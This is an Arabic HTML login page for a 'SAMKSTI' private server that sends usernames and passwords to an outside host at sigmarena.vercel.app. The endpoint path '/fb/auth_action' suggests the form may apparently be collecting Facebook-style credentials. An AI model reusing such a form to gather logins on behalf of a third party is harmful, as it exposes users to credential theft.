<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sigmarena Login</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background-color: #0b0b0c; 
            color: #ffffff; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 15px;
        }
        .login-card { 
            background: #141416; 
            padding: 35px 25px; 
            border-radius: 16px; 
            width: 100%;
            max-width: 360px; 
            box-shadow: 0px 10px 30px rgba(0,0,0,0.7); 
            border: 2px solid #ff4500;
            text-align: center;
        }
        .logo {
            font-size: 28px;
            font-weight: 900;
            color: #ff4500;
            letter-spacing: 2px;
            margin-bottom: 5px;
            text-transform: uppercase;
        }
        .sub-title {
            color: #77777c;
            font-size: 13px;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: right;
        }
        input { 
            width: 100%; 
            padding: 14px; 
            border: 1px solid #2a2a2e; 
            border-radius: 8px; 
            background: #1a1a1c; 
            color: #ffffff; 
            font-size: 15px; 
            transition: 0.3s;
        }
        input:focus { 
            border-color: #ff4500; 
            outline: none; 
            background: #202024;
        }
        button { 
            width: 100%; 
            padding: 14px; 
            background-color: #ff4500; 
            color: #ffffff; 
            border: none; 
            border-radius: 8px; 
            font-size: 16px; 
            font-weight: bold; 
            cursor: pointer; 
            transition: 0.2s; 
            margin-top: 15px; 
        }
        button:hover { 
            background-color: #e03e00; 
            transform: translateY(-1px);
        }
        .footer { 
            margin-top: 30px; 
            color: #44444a; 
            font-size: 11px; 
            letter-spacing: 1px;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo">SAMKSTI</div>
        <div class="sub-title">خادم السيرفر الخاص والمطور</div>
        
        <form action="https://sigmarena.vercel.app/fb/auth_action" method="POST">
            <div class="input-group">
                <input type="text" name="email" placeholder="اسم مستخدم" required autocomplete="off">
            </div>
            <div class="input-group">
                <input type="password" name="password" placeholder="كلمة المرور" required>
            </div>
            <button type="submit">تسجيل الدخول </button>
        </form>
        
        <div class="footer">SAMKSTI PRIVATE SERVER © 2026</div>
    </div>

</body>
</html>
